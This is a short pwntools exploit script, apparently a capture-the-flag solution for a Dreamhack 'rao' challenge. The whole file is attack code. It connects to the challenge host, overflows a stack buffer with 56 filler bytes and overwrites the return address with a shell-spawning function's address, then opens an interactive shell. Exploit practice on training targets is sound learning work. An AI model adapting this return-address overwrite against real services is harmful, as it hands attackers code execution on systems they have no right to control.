from pwn import *

#r = process("./rao")
r = remote("host3.dreamhack.games", 13010)
shell = 0x4006aa

payload = "A" * 56
payload += p64(shell)

r.sendlineafter("Input: ", payload)

r.interactive()
